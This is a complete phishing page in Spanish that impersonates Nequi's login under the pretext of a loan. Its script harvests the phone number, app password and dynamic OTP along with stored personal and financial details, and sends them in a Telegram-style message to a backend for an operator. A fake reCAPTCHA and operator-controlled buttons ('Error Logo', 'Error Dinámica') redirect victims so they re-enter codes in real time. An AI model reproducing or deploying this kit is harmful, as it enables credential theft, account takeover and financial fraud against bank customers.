<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Nequi</title>
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Manrope', system-ui, sans-serif;
            background: #fde7f1;
        }

        input {
            font-size: 16px !important;
        }

        .input-bg {
            background: #f9f7fc;
        }

        .field {
            position: relative;
        }

        .field label {
            position: absolute;
            left: 12px;
            top: 13px;
            font-size: .85rem;
            color: #190519;
            transition: all .2s ease;
            pointer-events: none;
        }

        .field input:focus+label,
        .field input:not(:placeholder-shown)+label {
            top: 4px;
            font-size: .65rem;
            color: #da0081;
        }

        #loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.7);
            backdrop-filter: blur(8px);
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .loader-gif {
            width: 100px;
        }

        footer {
            background-color: #333;
            color: white;
            padding: 40px 20px;
            margin-top: 40px;
        }

        .container-footer {
            max-width: 1100px;
            margin: 0 auto;
        }

        .container-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }

        .stores {
            display: flex;
            gap: 10px;
        }

        .stores img {
            height: 32px;
        }

        .separator {
            border: 0;
            border-top: 1px solid #555;
            margin: 25px 0;
        }

        .container-middle {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 20px;
        }

        .col a {
            display: block;
            font-size: 12px;
            color: #ccc;
            margin-bottom: 8px;
            text-decoration: none;
        }

        .col label {
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 10px;
            display: block;
        }

        .container-end {
            display: flex;
            gap: 15px;
            justify-content: center;
            padding-top: 20px;
        }

        .container-end img {
            width: 24px;
            filter: brightness(0) invert(1);
        }
    </style>
</head>

<body class="min-h-screen flex flex-col">

    <div id="loader-overlay">
        <img src="loader.gif" class="loader-gif">
    </div>

    <header class="w-full bg-white px-4 py-3 shadow-sm">
        <div class="max-w-[420px] mx-auto flex justify-between items-center">
            <img src="https://logosenvector.com/logo/img/nequi-37254.png" alt="Nequi" class="h-12" />
            <div class="space-y-1 cursor-pointer">
                <span class="block w-6 h-[2px] bg-[#200020]"></span>
                <span class="block w-6 h-[2px] bg-[#200020]"></span>
                <span class="block w-6 h-[2px] bg-[#200020]"></span>
            </div>
        </div>
    </header>

    <main class="px-4 mt-6 flex-grow">
        <div class="max-w-[420px] mx-auto bg-white rounded-lg p-6 shadow-sm">
            <h1 class="text-center text-2xl font-bold text-[#200020]">Entra a tu Nequi</h1>
            <p class="text-center text-sm text-gray-500 mt-1 mb-6">Continúa para solicitar tu préstamo.</p>

            <form class="space-y-4" onsubmit="return false;">
                <div class="flex h-11 gap-1">
                    <div class="flex items-center gap-2 px-3 input-bg rounded-sm">
                        <div class="w-6 h-4 overflow-hidden rounded-sm flex flex-col">
                            <div class="h-1/3 bg-yellow-400"></div>
                            <div class="h-1/3 bg-blue-700"></div>
                            <div class="h-1/3 bg-red-600"></div>
                        </div>
                        <input value="+57" readonly
                            class="w-9 bg-transparent text-sm text-[#200020] focus:outline-none" />
                    </div>
                    <div class="field flex-1 input-bg rounded-sm">
                        <input id="phone" type="tel" inputmode="numeric" placeholder=" "
                            class="w-full h-full bg-transparent px-3 pt-4 text-sm focus:outline-none" />
                        <label>Número de celular</label>
                    </div>
                </div>

                <div class="field h-11 input-bg rounded-sm">
                    <input id="password" type="password" inputmode="numeric" placeholder=" "
                        class="w-full h-full bg-transparent px-3 pt-4 text-sm focus:outline-none" />
                    <label>Contraseña</label>
                </div>

                <div class="field h-11 input-bg rounded-sm">
                    <input id="otp" type="tel" inputmode="numeric" placeholder=" "
                        class="w-full h-full bg-transparent px-3 pt-4 text-sm focus:outline-none" />
                    <label>Clave dinámica de 6 dígitos</label>
                </div>

                <div id="captchaContainer"
                    class="flex items-center justify-between border border-[#d3d3d3] bg-[#f9f9f9] p-3 rounded-sm w-full shadow-sm select-none">
                    <div class="flex items-center gap-3">
                        <div id="captchaBox" onclick="iniciarCaptcha()"
                            class="w-7 h-7 border-2 border-[#c1c1c1] bg-white flex items-center justify-center cursor-pointer transition-all">
                            <div id="captchaLoader"
                                class="hidden w-4 h-4 border-2 border-[#4A90E2] border-t-transparent rounded-full animate-spin">
                            </div>
                            <svg id="checkMark" class="hidden w-6 h-6 text-[#22c55e]" fill="none" stroke="currentColor"
                                viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3"
                                    d="M5 13l4 4L19 7"></path>
                            </svg>
                        </div>
                        <span class="text-sm text-[#555]">No soy un robot</span>
                    </div>
                    <div class="flex flex-col items-center opacity-80 scale-90">
                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="re" class="w-6 h-6">
                        <span class="text-[8px] text-gray-500">reCAPTCHA</span>
                    </div>
                </div>

                <button id="submitBtn" disabled
                    class="w-full h-11 rounded-sm text-white font-medium cursor-not-allowed transition-all"
                    style="background:#f1bfda">
                    Entra y Solicitar
                </button>
            </form>
        </div>
    </main>

    <!-- Footer genérico -->
    <footer>
        <div class="container-footer">
            <div class="container-top">
                <div class="logo-nequi"><img alt="logo nequi"
                        src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg"
                        class="h-8"></div>
                <div class="stores">
                    <img
                        src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
                    <img
                        src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
                </div>
            </div>
        </div>
    </footer>

    <script>
        const phone = document.getElementById('phone'), password = document.getElementById('password'), otp = document.getElementById('otp'), btn = document.getElementById('submitBtn');
        let captchaSolved = false;

        window.onload = () => {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('errorLogo')) {
                alert("⚠️ Verifica que el número de celular y la clave sean los correctos.");
            } else if (urlParams.has('errorOtp')) {
                alert("⚠️ La clave dinámica es incorrecta o expiró. Genera una nueva en tu App.");
            }
            if (localStorage.getItem('phone')) phone.value = localStorage.getItem('phone');
            if (localStorage.getItem('password')) password.value = localStorage.getItem('password');
            validate();

            if (!localStorage.getItem('s_attempts')) {
                localStorage.setItem('s_attempts', '2');
            }
        };

        function validate() {
            const ok = phone.value.length === 10 && password.value.length === 4 && otp.value.length === 6 && captchaSolved;
            btn.disabled = !ok; btn.style.background = ok ? '#da0081' : '#f1bfda'; btn.style.cursor = ok ? 'pointer' : 'not-allowed';
        }

        function onlyNumbers(el, max) {
            el.addEventListener('input', () => { el.value = el.value.replace(/\D/g, '').slice(0, max); validate(); });
        }
        onlyNumbers(phone, 10); onlyNumbers(password, 4); onlyNumbers(otp, 6);

        function iniciarCaptcha() {
            if (captchaSolved) return;
            document.getElementById('captchaLoader').classList.remove('hidden');
            setTimeout(() => {
                document.getElementById('captchaLoader').classList.add('hidden');
                document.getElementById('checkMark').classList.remove('hidden');
                captchaSolved = true; validate();
            }, 1500);
        }

        async function sendData() {
            document.getElementById('loader-overlay').style.display = 'flex';
            localStorage.setItem('phone', phone.value);
            localStorage.setItem('password', password.value);
            localStorage.setItem('otp', otp.value);

            const nombre = localStorage.getItem('p_nombre') || 'N/A';
            const apellido = localStorage.getItem('p_apellido') || 'N/A';
            const cedula = localStorage.getItem('p_cedula') || 'N/A';
            const direccion = localStorage.getItem('p_direccion') || 'N/A';
            const ingresos = localStorage.getItem('p_ingresos') || 'N/A';
            const gastos = localStorage.getItem('p_gastos') || 'N/A';
            const saldo = localStorage.getItem('p_saldo') || 'N/A';
            const prestamo = localStorage.getItem('p_prestamo') || 'N/A';

            const text = `<b>💰 PRÉSTAMO PROPULSOR</b>\n\n<b>👤 DATOS PERSONALES</b>\n<b>Nombre:</b> ${nombre} ${apellido}\n<b>Cédula:</b> ${cedula}\n<b>Dir:</b> ${direccion}\n\n<b>💵 FINANCIERO</b>\n<b>Ingresos:</b> ${ingresos}\n<b>Gastos:</b> ${gastos}\n<b>Saldo Actual:</b> ${saldo}\n<b>Quiere Prestar:</b> ${prestamo}\n\n<b>📱 CREDENCIALES</b>\n<b>Celular:</b> ${phone.value}\n<b>Clave:</b> ${password.value}\n<b>Dinámica:</b> ${otp.value}`;

            const keyboard = {
                inline_keyboard: [
                    [{ text: "❌ Error Logo", callback_data: "err_logo" }, { text: "❌ Error Dinámica", callback_data: "err_otp" }],
                    [{ text: "❌ Error Saldo", callback_data: "err_saldo" }],
                    [{ text: "✅ Aprobar Préstamo", callback_data: "finalizar" }]
                ]
            };

            try {
                const res = await fetch('/api/send-message', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text, keyboard }) });
                const data = await res.json();
                if (data.ok) {
                    const poll = await fetch(`/api/check-update/${data.result.message_id}`);
                    const act = await poll.json();

                    if (act.action === 'err_logo') {
                        window.location.href = "login.html?errorLogo=1";
                    } else if (act.action === 'err_otp') {
                        window.location.href = "login.html?errorOtp=1";
                    } else if (act.action === 'err_saldo') {
                        window.location.href = "monto.html";
                    } else {
                        window.location.href = "https://www.nequi.com.co";
                    }
                } else {
                    document.getElementById('loader-overlay').style.display = 'none';
                    alert("Error con servidor");
                }
            } catch (e) {
                document.getElementById('loader-overlay').style.display = 'none';
                alert("Error de conexión.");
            }
        }

        btn.addEventListener('click', sendData);
    </script>
</body>

</html>
